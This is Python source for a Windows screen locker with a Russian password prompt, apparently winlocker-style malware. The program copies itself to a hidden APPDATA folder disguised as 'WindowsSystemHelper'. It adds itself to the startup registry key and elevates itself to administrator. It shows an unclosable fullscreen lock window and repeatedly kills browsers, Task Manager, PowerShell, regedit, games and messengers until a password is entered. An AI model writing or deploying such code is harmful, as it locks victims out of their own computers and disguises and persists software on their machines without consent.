import os
import sys
import time
import ctypes
import psutil
import winreg
import shutil
import threading
import tkinter as tk
from tkinter import messagebox
import RAMWORKER

class ProcessBlocker:
    def __init__(self, password):
        self.running = True
        self.password = password


        self.browsers = [
            "msedge.exe", "chrome.exe", "firefox.exe",
            "opera.exe", "yandex.exe", "iexplore.exe"
        ]
        self.tools = [
            "taskmgr.exe", "powershell.exe",
            "regedit.exe", "mmc.exe", "control.exe"
        ]
        self.games = [
            "roblox.exe", "minecraft.exe", "tlauncher.exe",
            "rulauncher.exe", "javaw.exe", "java.exe"
        ]
        self.other = [
            "discord.exe", "steam.exe", "epicgameslauncher.exe",
            "battle.net.exe", "telegram.exe", "viber.exe"
        ]

        self._setup_paths()
        self._install_service()
        self._init_gui()

    def _setup_paths(self):
        self.appdata = os.environ['APPDATA']
        self.hidden_dir = os.path.join(self.appdata, 'WindowsSystemHelper')
        self.hidden_exe = os.path.join(self.hidden_dir, 'system_helper.exe')
        self.log_file = os.path.join(self.hidden_dir, 'system.log')

    def _install_service(self):
        if not os.path.exists(self.hidden_dir):
            os.makedirs(self.hidden_dir, exist_ok=True)
            os.system(f'attrib +h "{self.hidden_dir}"')

        if getattr(sys, 'frozen', False):
            src = sys.executable
        else:
            src = os.path.abspath(__file__)

        if not os.path.exists(self.hidden_exe):
            shutil.copy2(src, self.hidden_exe)
            os.system(f'attrib +h "{self.hidden_exe}"')

        self._add_to_startup()

    def _add_to_startup(self):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(
                key, "WindowsSystemHelper", 0, winreg.REG_SZ,
                f'"{self.hidden_exe}" --hidden'
            )
            winreg.CloseKey(key)
        except Exception as e:
            self._log_error(f"Startup error: {str(e)}")

    def handle_window_close(self):
        pass

    def _init_gui(self):
        self.root = tk.Tk()
        self.root.protocol("WM_DELETE_WINDOW", self.handle_window_close)
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='#1a1a1a')


        for key in ["<Alt-F4>", "<Control-Alt-Delete>", "<Control-Shift-Escape>"]:
            self.root.bind(key, lambda e: "break")

        self._create_lock_screen()

    def _create_lock_screen(self):

        content_frame = tk.Frame(self.root, bg='#2d2d2d', bd=0, highlightthickness=0,
                                relief='flat', padx=40, pady=40)
        content_frame.place(relx=0.5, rely=0.5, anchor='center')


        warning_label = tk.Label(content_frame,
                                text="Доступ ограничен!\nВведите пароль для разблокировки.",
                                font=("Arial", 24, 'bold'),
                                fg="#ffffff",
                                bg="#2d2d2d",
                                justify='center')
        warning_label.pack(pady=(0, 30))


        self.pass_entry = tk.Entry(content_frame,
                                 font=("Arial", 20),
                                 show="*",
                                 bd=2,
                                 relief='flat',
                                 bg="#3d3d3d",
                                 fg="white",
                                 insertbackground="white",
                                 width=25)
        self.pass_entry.pack(ipady=10, pady=(0, 20))

        submit_button = tk.Button(content_frame,
                                text="ПОДТВЕРДИТЬ",
                                font=("Arial", 16, 'bold'),
                                command=self._unlock_system,
                                bg="#4b6cb7",
                                fg="white",
                                activebackground="#3a5a99",
                                activeforeground="white",
                                bd=0,
                                relief='flat',
                                padx=30,
                                pady=10)
        submit_button.pack()


        separator = tk.Frame(content_frame, height=2, bg="#4b6cb7", bd=0)
        separator.pack(fill='x', pady=20)



    def start(self):
        if not self._is_admin():
            self._restart_as_admin()
            return

        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

        threading.Thread(target=self._process_monitor, daemon=True).start()

        self.root.mainloop()

    def _process_monitor(self):
        while self.running:
            try:
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        proc_name = proc.info['name'].lower()
                        if (proc_name in [p.lower() for p in self.browsers] or
                                proc_name in [p.lower() for p in self.tools] or
                                proc_name in [p.lower() for p in self.games] or
                                proc_name in [p.lower() for p in self.other]):
                            proc.kill()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
            except Exception as e:
                self._log_error(f"Process monitor: {str(e)}")

            time.sleep(0.4)



    def _unlock_system(self):
        if self.pass_entry.get() == self.password:
            try:
                RAMWORKER.write_txt_file("config.txt", "")
                RAMWORKER.remove_from_autostart("Soldi.exe")
                self.running = False
                self._block_registry_tools(False)
                self._remove_from_startup()
                self.root.destroy()
                os._exit(0)
            except Exception as e:
                messagebox.showerror("Ошибка", f"Ошибка разблокировки: {str(e)}")
        else:
            self.pass_entry.delete(0, 'end')

    @staticmethod
    def _is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def _restart_as_admin(self):
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit(0)
        except Exception as e:
            self._log_error(f"Admin restart failed: {str(e)}")
            messagebox.showerror("Ошибка", "Не удалось получить права администратора!")
            sys.exit(1)

    @staticmethod
    def _block_registry_tools(block):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                0, winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1 if block else 0)
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1 if block else 0)
            winreg.CloseKey(key)
        except Exception:
            pass

    def _remove_from_startup(self):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.DeleteValue(key, "WindowsSystemHelper")
            winreg.CloseKey(key)
        except Exception:
            pass

    def _log_error(self, message):
        with open(self.log_file, 'a') as f:
            f.write(f"[{time.ctime()}] {message}\n")
